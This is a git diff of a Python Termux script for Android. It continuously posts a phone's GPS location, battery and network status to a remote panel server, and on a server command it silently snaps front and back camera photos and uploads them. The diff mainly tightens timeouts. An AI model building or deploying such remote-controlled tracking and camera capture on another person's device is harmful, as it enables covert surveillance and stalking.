@@ -7,11 +7,19 @@ import uuid
 import base64
 import threading
 from datetime import datetime
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
 URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
 URL_UPLOAD_FOTO = "https://nexos-panel.onrender.com/api/upload_camera"
 ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
 ARQUIVO_FOTO = os.path.expanduser("~/nexos_captura.jpg")
+
+# Sessao com timeout AGRESSIVO
+session = requests.Session()
+retry = Retry(total=0, read=0, connect=0)
+adapter = HTTPAdapter(max_retries=retry)
+session.mount('https://', adapter)
 
 def run_command(cmd):
     try: return subprocess.check_output(cmd, shell=True).decode().strip()
@@ -31,7 +39,6 @@ print(f"🛰️  MOTOR NEXOS DUAL STREAM CARD OPERACIONAL")
 print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
 print("="*50 + "\n")
 
-# POSIÇÃO - NUNCA RESETA
 POSICAO = {"lat": -16.6869, "lon": -49.2648, "atualizado": False}
 posicao_lock = threading.Lock()
 headers_json = {"Content-Type": "application/json"}
@@ -49,17 +56,14 @@ def obter_status_rede():
     return "Dados Moveis"
 
 def thread_gps():
-    """Thread COMPLETAMENTE ISOLADA - se travar, nao afeta nada"""
     while True:
         try:
-            # Usa Popen para nao travar NUNCA
             proc = subprocess.Popen(
                 "termux-location -p gps -r once",
                 shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL
             )
-            # Espera no maximo 8 segundos
             try:
-                stdout, _ = proc.communicate(timeout=8)
+                stdout, _ = proc.communicate(timeout=5)
                 if stdout:
                     dados = json.loads(stdout.decode().strip())
                     lat = dados.get("latitude")
@@ -73,11 +77,9 @@ def thread_gps():
                 proc.kill()
         except:
             pass
-        time.sleep(5)
+        time.sleep(8)
 
-def thread_camera(comando):
-    """Thread para camera - envia foto sem travar loop"""
-    tipo, num = comando
+def thread_camera(tipo, num):
     try:
         if os.path.exists(ARQUIVO_FOTO):
             os.remove(ARQUIVO_FOTO)
@@ -87,7 +89,7 @@ def thread_camera(comando):
             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
         try:
-            proc.communicate(timeout=6)
+            proc.communicate(timeout=5)
         except:
             proc.kill()
         
@@ -99,26 +101,27 @@ def thread_camera(comando):
             
             payload = {"device_id": DEVICE_ID, "tipo": tipo, "photo": foto_b64}
             try:
-                requests.post(URL_UPLOAD_FOTO, data=json.dumps(payload), headers=headers_json, timeout=15)
-                print(f"   📸 {tipo} enviada!")
-            except:
-                print(f"   ❌ Falha ao enviar {tipo}")
+                r = session.post(URL_UPLOAD_FOTO, data=json.dumps(payload), 
+                               headers=headers_json, timeout=(3, 10))
+                if r.status_code == 200:
+                    print(f"   📸 {tipo} OK")
+                else:
+                    print(f"   ❌ {tipo} HTTP {r.status_code}")
+            except Exception as e:
+                print(f"   ❌ {tipo} erro")
         
         if os.path.exists(ARQUIVO_FOTO):
             os.remove(ARQUIVO_FOTO)
     except:
         pass
 
-# Inicia thread do GPS
 threading.Thread(target=thread_gps, daemon=True).start()
-print("🛰️  GPS isolado em thread - Loop LIVRE!\n")
+print("🛰️  LOOP RAPIDO INICIADO\n")
 
-# LOOP PRINCIPAL - ULTRARRÁPIDO
 while True:
     t0 = time.time()
     ts = datetime.now()
     
-    # BATERIA
     battery = "N/A"
     out_bat = run_command("termux-battery-status")
     if out_bat:
@@ -127,7 +130,6 @@ while True:
             battery = str(bat_data.get("percentage", "N/A"))
         except: pass
     
-    # POSIÇÃO (sem delay)
     with posicao_lock:
         lat = POSICAO["lat"]
         lon = POSICAO["lon"]
@@ -147,7 +149,9 @@ while True:
     }
     
     try:
-        response = requests.post(URL_SERVIDOR, data=json.dumps(payload), headers=headers_json, timeout=3)
+        # Timeout AGRESSIVO: 3s conectar, 2s ler
+        response = session.post(URL_SERVIDOR, data=json.dumps(payload), 
+                               headers=headers_json, timeout=(3, 2))
         if response.status_code == 200:
             res_data = response.json()
             comando_cam = str(res_data.get("comando_cam", "wait")).lower()
@@ -157,11 +161,12 @@ while True:
             print(f"{gps_icon} [{ts.strftime('%H:%M:%S')}] Bat:{battery}% {rede} | {dt:.1f}s")
             
             if comando_cam == "take_dual":
-                print("📸 [DUAL] Disparando cameras em paralelo...")
-                threading.Thread(target=thread_camera, args=(("back", 0),), daemon=True).start()
-                threading.Thread(target=thread_camera, args=(("front", 1),), daemon=True).start()
+                print("📸 [DUAL] Disparando cameras...")
+                threading.Thread(target=thread_camera, args=("back", 0), daemon=True).start()
+                time.sleep(0.3)
+                threading.Thread(target=thread_camera, args=("front", 1), daemon=True).start()
     except:
         dt = time.time() - t0
-        print(f"⚠️ [{ts.strftime('%H:%M:%S')}] Sem conexao | {dt:.1f}s")
+        print(f"📡 [{ts.strftime('%H:%M:%S')}] Offline | {dt:.1f}s")
     
     time.sleep(2.0)
